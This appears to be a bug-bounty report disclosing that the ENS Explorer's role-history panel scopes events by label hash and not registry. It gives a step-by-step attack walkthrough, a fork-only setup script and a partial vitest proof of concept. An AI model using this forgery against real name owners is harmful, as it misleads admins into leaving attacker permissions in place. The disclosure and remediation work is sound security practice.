# 92540 w a high the explorer s role history panel identifies a name by its label hash alone and never by the registry that holds it

**Submitted on Sep 10th 2026 at 15:05:42 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92540
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Summary

`/$name/roles` is the Explorer's permission screen. The name's admin opens a role holder's row with the edit action, which opens `RolesSidebar`, whose lower half is a **History** table: the record of every role grant and revocation that has ever touched that account on that name. It is what an owner reads to decide whether a delegated manager still has authority, and whether a removal actually happened.

The query behind it is scoped by *nothing but the label*.

```graphql
// apps/portal/src/features/roles/hooks/useRoleHistory.ts:50-68
query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
  events(
    where: {
      type: "EACRolesChanged"
      blockNumber_lt: $blockNumberLt
    }
    first: $first
    orderBy: blockNumber
    orderDirection: desc
  ) { type data transactionHash timestamp blockNumber }
}
```

There is no `contractAddress` in that `where`, even though the indexer's `EventFilter` offers one (`packages/indexer/graphql.gen.ts:282`). Every `EACRolesChanged` event ever emitted by **every ENS v2 registry** is pulled down — up to `PAGE_SIZE * MAX_PAGES` = 50 000 of them (`useRoleHistory.ts:24,27`) — and the only narrowing is client-side:

```ts
// apps/portal/src/features/roles/hooks/useRoleHistory.ts:84-86
const resource = label ? toResourceHex(labelToCanonicalId(label)) : undefined
return ok(filterEventsByResource(allEvents, resource))
```

`labelToCanonicalId` is `hexToBigInt(labelhash(label)) ^ low32` — a pure function of **one label string**, with no registry, no parent, no namehash in it. And the caller passes only the leading label: `RolesSidebar.tsx:323-327` renders `<RoleHistoryTable name={name} label={getNameLabels(name).currentLabel} account={selectedAccount} />`, where `getNameLabels` is `name.split('.')` and `currentLabel = labels[0]` (`features/registry/utils/nameUtils.ts`).

So the identity of a name, for this panel, is `keccak256(firstLabel) & ~0xffffffff` — a value **every ENS v2 registry in existence assigns to its own name of the same label**. `treasury.eth` on the canonical `.eth` registry and `treasury.anything.eth` in a subregistry anybody can deploy for one transaction are, to this panel, the same name.

The audit trail is therefore writable by anyone. An attacker deploys her own registry, registers a subname carrying the victim's label, then grants and revokes roles in it. Each transaction emits `EACRolesChanged(resource = canonicalId(victimLabel), account = <her choice>, old, new)` — and the Explorer renders it, newest-first, under the victim's name, alongside a transaction hash the "More" button opens in a panel headed by the victim's ENS name (`RoleHistoryTable.tsx:35-56, 190-197`; `EventsSidebar.tsx:57-58,85` renders `<NameDisplay name={displayName} />`, where `displayName = name || …` and `name` is the route's name).

The sibling hook in the same directory does it correctly, and its comment names this exact hazard:

```ts
// apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:52-61
 * We can't use the indexer's top-level `roles(resource:)` field because it
 * isn't scoped by registry — `ROOT_RESOURCE` (`0x0`) is shared across every
 * sub-registry, so a resource-only filter would conflate role grants across
 * unrelated registries. The `events(contractAddress:)` filter is registry-
 * scoped, so we use that and reconstruct state client-side.
```

`useNameRoleAccounts` then does two things `useRoleHistory` does not: it passes `contractAddress: $contractAddress` (`:69-91`, `contractAddress:` at `:77`), and it reads the resource **from the actual registry on chain** rather than deriving it from a string (`:120-129`, `ensjs_getResource(client, { label, registryAddress })`).

And it is not one sibling but two. `apps/portal/src/features/registry/hooks/useRegistryRoleHistoryForAccount.ts` issues the same `EACRolesChanged` query and also scopes it — `contractAddress: $contractAddress` at `:57`, bound to `registryAddress.toLowerCase()` at `:72`. Its own header comment classifies all three hooks, and names the defect without meaning to:

```ts
// apps/portal/src/features/registry/hooks/useRegistryRoleHistoryForAccount.ts:1-9
 * Mirrors the query strategy used by
 * `useNameRoleAccounts` (which is per-name) and `useRoleHistory` (which is
 * global) but scoped to the registry overview's add/edit-user UI.
```

The repository itself calls `useRoleHistory` **global**. That is exactly the bug: a hook rendered under one name's page, on a screen labelled that name's History, whose query is global across every registry in the system.

***

## Impact

### The attack

Precondition on the attacker: one v2 `.eth` registration, plus gas. No relationship with the victim, no interaction from the victim, no wallet connection from the victim. Every step runs through the Explorer's own UI and its own transaction builders, which the PoC imports and submits verbatim.

Alice owns `treasury.eth` and has delegated `ROLE_SET_RESOLVER` on it to Mallory — the ordinary arrangement the roles page exists to manage. Mallory wants to keep that authority after Alice decides to end it.

1. Mallory registers any 2LD she likes — `mal.eth`.
2. On `/mal.eth/registry` she presses **Configure registry → Deploy a new Permissioned Registry contract**. `prepareDeploySubregistryTransaction` + `prepareSetSubregistryTransaction` give her a registry she is root admin of.
3. On `/mal.eth/create-subname` she creates the subname **`treasury`**. `prepareCreateSubnameTransaction` registers it in *her* registry at EAC resource `labelToCanonicalId('treasury')` — bit-for-bit the resource of Alice's `treasury.eth` on the canonical `.eth` registry (proved on the fork in PoC test 2).
4. On `/treasury.mal.eth/roles` she uses **Add user** then **Remove user** on her own address, both built by `prepareGrantRolesTransaction` / `prepareRevokeRolesTransaction`, emitting `EACRolesChanged(canonicalId('treasury'), Mallory, 0 → 3 roles)` and then `3 roles → 0`.

Alice now opens `/treasury.eth/roles` with her admin wallet connected, opens Mallory's row, and scrolls to **History**. She reads three rows. The newest — `3 roles → 0 roles − ROLE_RENEW − ROLE_SET_RESOLVER − ROLE_SET_SUBREGISTRY` — and the one below it came from Mallory's own registry. Only the oldest, `0 roles → 1 roles + ROLE_SET_RESOLVER`, is a real event on Alice's name. `filterEventsByResource` sorts `blockNumber` descending (`filterEventsByResource.ts:76`) and `RoleHistoryTable` filters to the selected account (`RoleHistoryTable.tsx:157-163`), so the attacker fully controls the *last* thing Alice sees about this account.

Mallory's `ROLE_SET_RESOLVER` on `treasury.eth` is untouched throughout — the PoC reads `hasRoles` off the chain before and after and it is `true` both times. She can call `setResolver` on `treasury.eth` and point it at a resolver she controls, whenever she chooses.

### What is being controlled

Every field of a row is attacker-chosen: the **account address** (she grants to any address, so she can fabricate a grant to a third party as easily as a revocation of her own); the **roles added and removed**; the **transaction hash and timestamp** (her own transaction, which "More" then presents inside `EventsSidebar` headed by *the victim's ENS name* — `RoleHistoryTable.tsx:190-197`, `EventsSidebar.tsx:57-58,85`); and the **number of rows**, one transaction each, unbounded. She can also invert it: fabricate a grant of `ROLE_SET_RESOLVER`, `ROLE_SET_SUBREGISTRY` and `ROLE_UNREGISTER` to an address of her choosing, and let the victim discover an apparent hostile takeover of a name that is in fact untouched.

### Who sees it — the audience is the one person whose decision it corrupts

`RolesSidebar` is opened only by `setEditingRow(row)` + `setOpen(true)`, and that callback is wired only inside `buildEditActionColumn`, which `RolesTable.tsx:61-69` appends **only when `canManageRoles`**:

```tsx
// apps/portal/src/features/roles/components/RolesTable.tsx:61-69
const columns: ColumnDef<AccountGroup>[] = canManageRoles
  ? [...baseColumns, buildEditActionColumn<AccountGroup>((row) => { setEditingRow(row); setOpen(true) })]
  : [...baseColumns, buildActionSpacerColumn<AccountGroup>()]
```

`DataTable.tsx` has no row `onClick` and no `onRowClick`, so there is no other way in, and `canManageRoles = Boolean(currentAccountRoles?.decoded?.find(isAdminRole))` (`NameRolesOverviewTable.tsx:105-107`) requires the **connected wallet to hold an admin role on that name**.

So the forged history reaches exactly one class of viewer: the name's own admin, wallet connected, reviewing whether a delegate still holds power. That is not a weakening of the finding — it is the whole finding. The single reader of the forged trail is the single person whose decision it corrupts, and she reaches it by doing precisely the right thing.

### Where this happens without an attacker at all — and it is happening now

The collision does not need an attacker; it exists in the live indexer today. `packages/indexer/urql/client.ts:28,36` defaults `INDEXER_GRAPHQL_URL` to `https://staging-graphql.ens.dev/`, which is reachable. Running the **shipped query verbatim** with the app's own pagination, then the app's own `filterEventsByResource(rows, toResourceHex(labelToCanonicalId('research')))` — full harness and run in the PoC section:

```
  rows pulled by the SHIPPED query: 10000
  distinct registry contracts in that page set: 1305

  labelToCanonicalId('research') = 0x95f7801c97b17401c2c5a5b8fdb4f956cc377f647e35794f5b5da6ae00000000
  rows the panel would render as "research.<x>.eth" history:
    registry 0x4d2b9db6b011425f12f271fa680b0ec8c2f0cd0e  names: research.capsulefleet.eth
    registry 0xd0d823c89c68e7a80e4bd5215999965065b4255d  names: research.nymspace.eth
```

Two unrelated names in two unrelated registries, with different owners, already share the single resource `0x95f7801c…00000000`, and the shipped filter already accepts both as one name's history. Nobody attacked anything. Ten thousand rows spanning **1,305 distinct registry contracts** come back from a query the app believes is about one name.

The accidental case has one honest limit, worth stating before a reviewer finds it. The **hook** returns every `research.*` row, but the **rendered table** is narrowed once more: `RoleHistoryTable.tsx:157-163` filters to `selectedAccount`, and that account list comes from `useNameRoleAccounts`, which *is* registry-scoped. So an accidental cross-registry row reaches a screen only when one address holds roles in both registries — in the `research` collision the two accounts differ, so nothing would render there. That limit is exactly why the deliberate variant matters and why it is trivially satisfied: Mallory grants to **herself**, and she is already a legitimate row on the victim's table because the victim genuinely delegated to her. The account filter is not a defence against her; it is her delivery mechanism.

I claim no transfer, no theft, no denial of service. The claim is what the PoC demonstrates: the Explorer presents, as one name's permission history, an address and a transaction belonging to a different name in a different registry, because it decided that a name is a label hash.

***

## Root cause

### The read side: identity without a registry

| File:line                                                             | Code                                                                                                                       | Problem                                                                                                                                                                                                             |
| --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `apps/portal/src/features/roles/hooks/useRoleHistory.ts:50-68`        | `events(where: { type: "EACRolesChanged", blockNumber_lt: $blockNumberLt } …)`                                             | No `contractAddress`, so every registry's role events enter the page. The filter is in the schema (`packages/indexer/graphql.gen.ts:282`) and both sibling hooks use it.                                            |
| `apps/portal/src/features/roles/hooks/useRoleHistory.ts:84`           | `const resource = label ? toResourceHex(labelToCanonicalId(label)) : undefined`                                            | Identity derived from one label string. No registry, parent or namehash participates.                                                                                                                               |
| `apps/portal/src/features/roles/hooks/useRoleHistory.ts:86`           | `filterEventsByResource(allEvents, resource)`                                                                              | The only narrowing is this client-side resource compare.                                                                                                                                                            |
| `apps/portal/src/lib/roles/filterEventsByResource.ts:62,76`           | `if (resource && !resourcesMatch(data.resource, resource)) continue` … `.toSorted((a,b) => b.blockNumber - a.blockNumber)` | The compare is correct; the *value compared to* is ambiguous. Descending sort puts the newest forgery first.                                                                                                        |
| `apps/portal/src/features/roles/components/RolesSidebar.tsx:323-327`  | `label={getNameLabels(name).currentLabel}`                                                                                 | `name.split('.')`, then `labels[0]` (`features/registry/utils/nameUtils.ts`). Only the leading label survives.                                                                                                      |
| `apps/portal/src/features/roles/hooks/useRoleHistory.ts:20-22, 89-92` | `type GetRoleHistoryParameters = { readonly label?: string }` → `createQueryKey<'get-role-history', …>`                    | Cache key is the label alone. Not an independent defect — a registry-blind query hands both names identical data anyway — but the registry cannot be reintroduced without touching the key. Hardening fix #3 below. |

### The write side: the same resource is reachable from any registry

| File:line                                                                            | Code                                                                                                                                               | Problem                                                                                                                |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `@ensdomains/ensjs/utils/v2` `labelToCanonicalId`                                    | `const id = hexToBigInt(labelhash(label)); return id ^ (id & 0xffffffffn)`                                                                         | Registry-independent. Two registries holding the same label hold the same EAC resource.                                |
| `apps/portal/src/features/registry/helpers/deploySubregistry.ts:57-83`               | `prepareDeploySubregistryTransaction` → `VerifiableFactory.deployProxy(UserRegistryImpl, salt, initialize(msg.sender, 0x1111…))`                   | Anyone can deploy a registry they are root admin of, from the Explorer's own button.                                   |
| `apps/portal/src/features/registry/utils/create-subname.helpers.ts:60-88`            | `prepareCreateSubnameTransaction` → `register(label, owner, …)`                                                                                    | Anyone can create, in their own registry, a subname with any label — including one another registry already uses.      |
| `apps/portal/src/features/roles/helpers/grantRoles.ts:58-91`, `revokeRoles.ts:60-93` | `const { label } = makeLabelNodeAndParent(name); const resource = labelToCanonicalId(label)` → `grantRoles/revokeRoles(resource, bitmap, account)` | Every grant/revoke in her own registry emits `EACRolesChanged` at exactly the resource the victim's panel filters for. |

### Why this is not intended behaviour

1. **The sibling hook does it correctly and documents the hazard.** `useNameRoleAccounts.ts:52-61` says a resource-only filter "would conflate role grants across unrelated registries", then passes `contractAddress: $contractAddress` at `:77`.
2. **It also refuses to derive the resource from a string.** `useNameRoleAccounts.ts:120-129` reads it on chain, commenting "so the indexer lookup works at any name depth, not just labels held in the v2 ETHRegistry where `resource === labelToCanonicalId(label)`". `useRoleHistory` uses the very expression that comment calls insufficient.
3. **Of the three hooks in `apps/portal` that query `EACRolesChanged`, two supply the filter** — `features/roles/hooks/useNameRoleAccounts.ts:77` and `features/registry/hooks/useRegistryRoleHistoryForAccount.ts:57` — and only `useRoleHistory` does not. Omitting it in one of three otherwise-parallel hooks is an oversight, not a design.
4. **The repository documents the anomaly in its own words**, `useRegistryRoleHistoryForAccount.ts:1-9`: "`useNameRoleAccounts` (which is per-name) and `useRoleHistory` (which is **global**)". No reading of that makes an unscoped per-name history intentional.

***

## Preempting the likely closure arguments

**"Out of scope —&#x20;*****the ENS smart contracts, subgraph/indexer, and NFT metadata service are out of scope*****" (RULES.md:995).** That line excludes the indexer **as an asset**: a defect in the indexer's own behaviour. Nothing here is asked of the indexer, which answers exactly the query it is given — the live run proves it both ways, returning every registry's events without `contractAddress` and one registry's with it. The bug is the question, and the question is authored in `apps/portal`: it lives at `features/roles/hooks/useRoleHistory.ts:50-68`, the fix is one line in that file, two other hooks **in `apps/portal`** already write the corrected query (`useNameRoleAccounts.ts:77`, `useRegistryRoleHistoryForAccount.ts:57`), and the omitted field is already in the published schema (`packages/indexer/graphql.gen.ts:282`), so nothing in the indexer changes for the fix to land. The contracts are equally blameless: each registry stores role state under `keccak(label) & ~0xffffffff` **in its own storage**, which is correct — it is the app that dropped the registry half of the key.

**"UX and UI impacts that do not materially disrupt use of the platform" (RULES.md:1009).** This is the exclusion with real teeth, and it does not reach this finding. The panel is the only in-app record of who has held authority over a name and when it was taken away, and it is where the app sends an admin to answer that question. The disruption is decision-level: the forged newest row asserts a delegate's roles were stripped while `hasRoles` reads `true` on chain immediately afterwards, so an admin who trusts the screen leaves live authority in an attacker's hands. The content is attacker-chosen and persistent, not a rendering artefact — the rows survive reload, cache eviction and redeploy because they are real chain events the query will keep matching — no user error is required, and it already misfires without any attacker in the live indexer today. "Does not materially disrupt use" covers a misaligned button; it does not cover a permission audit trail that reports the opposite of the on-chain truth to the only person authorised to act on it.

**"The events are real, so nothing is forged."** The events are real; the *attribution* is fabricated. Every row rendered under `treasury.eth` asserts something happened to `treasury.eth`, and for the two attacker rows nothing did — the same class of claim as showing a real transaction under the wrong name.

**"An operator would notice the odd rows."** Nothing distinguishes them. The table renders Date, Account, Changes, Roles — no registry column, no name column, no parent (`RoleHistoryTable.tsx:214-218, 198-245`) — and the sidebar "More" opens is headed by the victim's own name (`EventsSidebar.tsx:57-58,85`).

**"Is it recoverable, and is the precondition expensive?"** The forged rows are permanent — real events on a real chain, which the panel keeps serving while the query is unscoped, and the attacker can add more at the exact moment the victim is looking. The precondition is six transactions (one `.eth` registration, one `deployProxy`, one `setSubregistry`, one `register`, two role calls), all through the Explorer's own buttons, all in the PoC, with nothing asked of the victim.

***

## Not a duplicate

### First, the fold-in this most resembles: the #91062 / #89293 resolver-roles scope umbrella

I filed #91306 in this competition. Immunefi triage matched it to #91062 with this language, and ENS then confirmed it as a duplicate of #89293, "the resolver-roles scope finding first reported in #89293":

> "both trace to the same **scope-resolution defect where grants and revocations spanning multiple on-chain resources are collapsed into a single row, and an unresolved resource falls back to a root-scope sentinel that silently grants or misapplies authority across all names**"

I raise it first because it is the umbrella most likely to be swung at this report. It has three named elements; this report has none of them.

**1. "Grants and revocations spanning multiple resources collapsed into a single row."** That is `groupRolesByAccount`, at `lib/roles/resolverRoles.ts:179`, called from exactly one place — `features/resolver/components/ResolverRolesTable.tsx:103`. It is not on this code path at all. `RoleHistoryTable` collapses nothing: one row per `EACRolesChanged` event, in block order, every row carrying the **same** resource. The problem here is the opposite one — a single resource value shared by names it should distinguish.

**2. "An unresolved resource falls back to a root-scope sentinel."** There is no sentinel in this path. `useRoleHistory.ts:84` computes `label ? toResourceHex(labelToCanonicalId(label)) : undefined`; the word `ROOT` does not appear in the file, and the degenerate branch is `undefined`, which *disables* narrowing rather than substituting `ROOT_RESOURCE` — and it is unreachable from the panel, since `RolesSidebar.tsx:323-327` always passes `currentLabel`. The resource here is always concrete and correctly computed. It is not unresolved; it is resolved to a value that is **not unique**, a different failure entirely.

**3. "Silently grants or misapplies authority across all names."** This report **misapplies no authority and grants nothing**. No transaction is built against the victim's name, none is sent, none is signed, none is prepared for signing; the attacker's two role transactions execute in a registry she owns, against a name she owns. The PoC's final assertion is exactly this: `hasRoles(victimResource, ROLE_SET_RESOLVER, Mallory)` on the canonical registry reads `true` before the forgery and `true` after it, so on-chain permission state is provably unchanged. Where #91306 / #91062 / #89293 are about a **write** reaching further than the operator intended, this is about a **read** reporting something that never happened.

Everything else is disjoint: different feature directory (`features/roles/` vs `features/resolver/`), different contract (registry vs PermissionedResolver), different direction, different consequence. And the fixes do not overlap — carrying a typed scope through `groupRolesByAccount` does not add `contractAddress: $contractAddress` to `useRoleHistory`'s `where`, and adding it does not touch the resolver editor.

### Known Issues

* *QA-01 / WEB-1257 / WEB-1305* — role combinations after a transfer, an undetached registry after a parent transfer, a hung transfer of roles to a V1 name. All three concern on-chain role *state* after a transfer. This report involves no transfer and no change to role state, and the PoC proves the state is unchanged.
* *WEB-1249* — subname creation replacing a child registry. Here the subname is created in the *attacker's own* registry; nothing is replaced or orphaned. It is a carrier for an event, not the target.
* *WEB-716* — the registry page only offers deploy when the slot is empty. That is the deploy affordance; this is the history query.
* *EXP-INPUT-005* — validator leniency on homoglyphs and control characters, "display confusion rather than incorrect resolution". No unusual character is involved: both labels are the same ASCII string, deliberately. The collision is structural, not typographic; a stricter validator changes nothing.
* *EXP-INPUT-003* — persisted store state parsed without validating value shapes. Different data path, different store.
* *R3-01…R3-08* — transaction-manager defects. This flow performs no transaction on the victim's side.

### Existing reports

* *#91838* (migration grants a stale v1 controller a permanent `ROLE_SET_RESOLVER`) — that is about *which account* a migration batch grants a role to. Here no grant is made on the victim's name at all.
* *#90161* (transfer authorizes the raw name but moves the normalized token) and the **raw-vs-normalized family** (#89270, #90163, #90190, #91837, #92043) — all turn on one name expression normalizing to a different one. Nothing here normalizes; both names are the identical byte string. The ambiguity is that a *label hash* is not a name, because it omits the registry — a different equivalence class, and a different fix: not "normalize consistently" but "carry the registry alongside the resource".
* *#91314 / #89441 / #91851 / #91900* (the resolution family) — no resolution, no reverse record, no `addr` lookup is involved.
* *#90307* (unbounded expiry crashes the names page) — a rendering crash on a numeric range; this renders fine and renders a falsehood.

***

## Recommendation

Three changes, all in `apps/portal`. The principle: the identity of a name for role purposes is `(registry, resource)`, never a resource alone and never a label.

1. **Scope the query by contract.** `useRoleHistory` takes a `registryAddress` and passes it into the `where`, exactly as `useNameRoleAccounts.ts:69-91` does: `where: { type: "EACRolesChanged", contractAddress: $contractAddress, blockNumber_lt: $blockNumberLt }`. The caller already has it — `RolesSidebar` receives `registryAddress` as a prop (`RolesSidebar.tsx:58`, from `RolesTable.tsx:78`) and passes it to every grant and revoke it builds. It simply is not passed to `RoleHistoryTable`.
2. **Read the resource, don't compute it.** Replace `toResourceHex(labelToCanonicalId(label))` with the on-chain read the sibling already performs, `ensjs_getResource(client, { label, registryAddress })` (`useNameRoleAccounts.ts:120-129`). This also fixes the panel for any registry whose resource derivation differs from the `.eth` registry's — precisely what the sibling's comment warns about.
3. **Put the registry in the cache key** — hardening, not a second bug. `GetRoleHistoryParameters` becomes `{ registryAddress: Address; label?: string }`. The label-only key is harmless today because a registry-blind query hands both names identical data anyway; it becomes load-bearing the moment fix 1 lands.

Optionally, and cheaply: render the resource (or the owning registry) as a column in `RoleHistoryTable`, so any future scoping gap is visible rather than silent.

## Proof of Concept

## Proof of Concept

### Environment

A local Anvil fork of Ethereum Sepolia, chain id `11155111`, on `http://127.0.0.1:8618`. Nothing in the fork PoC touches a live network beyond forked reads; the test throws at import time if the RPC is not `127.0.0.1`/`localhost`.

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
      --chain-id 11155111 --port 8618 --silent &
cast chain-id --rpc-url http://127.0.0.1:8618      # -> 11155111
```

Real deployed Sepolia v2 addresses, all reached through the fork. The last two come from the app's own chain config, `getChainContractAddress({ chain: sepoliaWithEns, contract: 'ensVerifiableFactory' | 'ensUserRegistryImpl' })` (`ConfigureRegistryForm.tsx:33-41`):

```
ETHRegistrar          0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry           0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MockUSDC              0x768F42455A2D082E23ceeF7d51e5787C82d67a39
VerifiableFactory     0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
UserRegistry impl     0x624a25d67B59D587752EbEc8DdeD8827dAe52050
```

### Setup

`apps/portal/.poc91306/setup.sh` registers the victim's name and the attacker's name on the real v2 registrar, and makes the one **genuine** grant the story needs: Alice delegates `ROLE_SET_RESOLVER` on her name to Mallory.

```bash
#!/usr/bin/env bash
# Fork-only setup for the role-history cross-registry PoC.
set -euo pipefail
R=http://127.0.0.1:8618
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
REGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
FUNDER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

ALICE_KEY=0x1111111111111111111111111111111111111111111111111111111111111111   # victim
MAL_KEY=0x3333333333333333333333333333333333333333333333333333333333333333     # attacker
ALICE=$(cast wallet address --private-key $ALICE_KEY)
MAL=$(cast wallet address --private-key $MAL_KEY)
echo "VICTIM   (alice)   = $ALICE"
echo "ATTACKER (mallory) = $MAL"

# [… 6 lines elided: for each of $ALICE $MAL — anvil_setCode 0x (these
#    well-known vanity keys carry EIP-7702 delegations on real Sepolia),
#    anvil_setBalance, and a MockUSDC mint from $FUNDER_KEY …]

register () {  # $1 label  $2 key  $3 owner  $4 secret
  # [… 12 lines elided: USDC approve, makeCommitment, commit, evm_increaseTime
  #    120 + evm_mine, then register(label, owner, secret, 0, 0, 31536000,
  #    USDC, 0) on the real v2 ETHRegistrar; echoes "registered $1.eth -> $3" …]
}

VICTIM_LABEL=${VICTIM_LABEL:-p91306treasury}
register "$VICTIM_LABEL" $ALICE_KEY $ALICE 0x5555555555555555555555555555555555555555555555555555555555555555
register "p91306mal"     $MAL_KEY   $MAL   0x6666666666666666666666666666666666666666666666666666666666666666

# Alice's REAL delegation: Mallory gets ROLE_SET_RESOLVER on the victim's name.
LH=$(cast keccak "$VICTIM_LABEL")
RES=$(cast call $REGISTRY "getResource(uint256)(uint256)" $LH --rpc-url $R | awk '{print $1}')
SET_RESOLVER=16777216   # 1 << 24
cast send $REGISTRY "grantRoles(uint256,uint256,address)" $RES $SET_RESOLVER $MAL --private-key $ALICE_KEY --rpc-url $R >/dev/null
echo "granted ROLE_SET_RESOLVER on $VICTIM_LABEL.eth to $MAL"
echo "victim resource = $(cast call $REGISTRY 'getResource(uint256)(uint256)' $LH --rpc-url $R)"
```

Output:

```
VICTIM   (alice)   = 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
ATTACKER (mallory) = 0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB
registered p91306treasury.eth -> 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
registered p91306mal.eth -> 0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB
granted ROLE_SET_RESOLVER on p91306treasury.eth to 0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB
victim resource = 41578911855189023983192881883552396450087400340233782877786803477336561811456 [4.157e76]
```

**The script is not idempotent.** Run it once against a fresh fork: a second run aborts at the first `register` with `NameNotAvailable("p91306treasury")`, and `set -e` stops it before the genuine `grantRoles` is reached.

### What the fork test does, and does not, do

* It runs against the unmodified shipped source at commit `1c9b47f`. Every attacker transaction is built by an **imported app builder** and submitted byte-for-byte (`prepareDeploySubregistryTransaction`, `prepareSetSubregistryTransaction`, `prepareCreateSubnameTransaction`, `prepareGrantRolesTransaction`, `prepareRevokeRolesTransaction`); the proxy address is recovered with the app's own `parseProxyDeployedAddress`.
* The filtering step is the app's own `filterEventsByResource(allEvents, toResourceHex(labelToCanonicalId(label)))` — the exact expression at `useRoleHistory.ts:84-86` — imported, not reimplemented. Test 0 reads `useRoleHistory.ts` and `useNameRoleAccounts.ts` off disk and asserts both `where` clauses verbatim, so nothing rests on a paraphrase.
* **What is substituted, stated plainly:** no indexer runs on the fork, so *this* test does not perform the GraphQL round-trip. It substitutes the real on-chain `EACRolesChanged` logs of both registries, re-serialised into the exact `Event` row shape the repo's own unit test for this path uses (`lib/roles/filterEventsByResource.test.ts:14-33`). Everything downstream — resource compare, sort, role decode, account filter — is shipped code running on real log data. The round-trip itself is executed against the **live** indexer in the second test; nothing here is left inferred.
* It does not stop at the filter: it reads `hasRoles` off the chain before and after to show the victim's delegation is untouched.

Assertion polarity: every `expect` states the vulnerable behaviour. Against the shipped source the suite **passes** — that is the vulnerability.

### PoC source

`apps/portal/.poc91306/role-history-cross-registry.poc.test.ts`. Pure scaffolding is elided with an explicit marker; every assertion and every call into app code is shown verbatim.

```ts
/**
 * PoC — the Explorer's role-history panel identifies a name by its LABEL HASH
 * alone and never by the registry that holds it, so role events emitted by any
 * other ENS v2 registry for the same label are rendered as that name's history.
 *
 * LOCAL ANVIL FORK ONLY (Sepolia, chain id 11155111, http://127.0.0.1:8618);
 * throws at import time if the RPC is not localhost. Run `.poc91306/setup.sh`
 * first, then:
 *   npx vitest run --reporter=verbose \
 *     .poc91306/role-history-cross-registry.poc.test.ts
 *
 * ASSERTION POLARITY: every `expect` states the VULNERABLE behaviour.
 * Against the shipped source the suite PASSES — that is the vulnerability.
 */

import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
// [… 16 lines elided: type + value imports from viem, viem/accounts,
//    viem/chains and vitest …]
import { prepareDeploySubregistryTransaction } from '@/features/registry/helpers/deploySubregistry'
import { prepareSetSubregistryTransaction } from '@/features/registry/helpers/setSubregistry'
import { prepareCreateSubnameTransaction } from '@/features/registry/utils/create-subname.helpers'
import { parseProxyDeployedAddress } from '@/features/resolver/utils/permissionedResolver'
import { prepareGrantRolesTransaction } from '@/features/roles/helpers/grantRoles'
import { prepareRevokeRolesTransaction } from '@/features/roles/helpers/revokeRoles'
import { filterEventsByResource, type IndexerEACEvent } from '@/lib/roles/filterEventsByResource'
import { toResourceHex } from '@/lib/roles/toResourceHex'

// ── fork guard ───────────────────────────────────────────────────────────────
const RPC = process.env.POC_RPC ?? 'http://127.0.0.1:8618'
if (!/^http:\/\/(127\.0\.0\.1|localhost):/.test(RPC)) {
  throw new Error(`refusing to run: ${RPC} is not a local fork`)
}

// Real deployed ENS v2 Sepolia addresses (@ensdomains/ensjs chain config).
const ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as const
const VERIFIABLE_FACTORY = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef' as const
const USER_REGISTRY_IMPL = '0x624a25d67B59D587752EbEc8DdeD8827dAe52050' as const
/** The victim's 2LD label, and the attacker's, both set up by setup.sh. */
const VICTIM_LABEL = 'p91306treasury'
const VICTIM_NAME = `${VICTIM_LABEL}.eth`
const ATTACKER_LABEL = 'p91306mal'
/** Throwaway owner of the attacker's decoy subname. */
const BURNER = '0x00000000000000000000000000000000DeaDBeef' as const

// [… 46 lines elided, all plain viem/vitest scaffolding: ALICE and MALLORY from
//    privateKeyToAccount('0x1111…') / ('0x3333…'); EAC_ROLES_CHANGED_TOPIC; the
//    eacEventAbi and registryReadAbi parseAbi fragments (EACRolesChanged /
//    getResource, roles, hasRoles); publicClient + aliceWallet + malloryWallet
//    against RPC; and `submit(wallet, intent)`, which sends the `request` an app
//    builder returned and resolves to { status, blockNumber, hash } …]

/**
 * Turn the real on-chain EACRolesChanged logs of `address` into the exact
 * `Event` rows the indexer serves `useRoleHistory` — `{ type, data, … }` with
 * `data` a JSON string of `{ resource, account, oldRoleBitmap, newRoleBitmap }`.
 * That shape is the repo's own: `lib/roles/filterEventsByResource.test.ts:14-33`.
 */
const indexerRowsFor = async (address: Address): Promise<IndexerEACEvent[]> => {
  // [… 38 lines elided: getLogs over the post-fork blocks only (Anvil caps
  //    eth_getLogs at 50k blocks), decodeEventLog with eacEventAbi, and the
  //    push of each decoded log into the row shape described above …]
}

// ── the shipped hooks, read off disk ─────────────────────────────────────────
const HOOK_SRC = readFileSync(resolve(process.cwd(), 'src/features/roles/hooks/useRoleHistory.ts'), 'utf8')
const SIBLING_SRC = readFileSync(resolve(process.cwd(), 'src/features/roles/hooks/useNameRoleAccounts.ts'), 'utf8')

let attackerRegistry: Address
let victimResource: bigint

beforeAll(async () => {
  expect(await publicClient.getChainId()).toBe(11155111)
  // [… 7 lines elided: anvil_setCode 0x on both vanity keys …]
  victimResource = await publicClient.readContract({
    address: ETH_REGISTRY, abi: registryReadAbi, functionName: 'getResource',
    args: [BigInt(labelhash(VICTIM_LABEL))],
  })
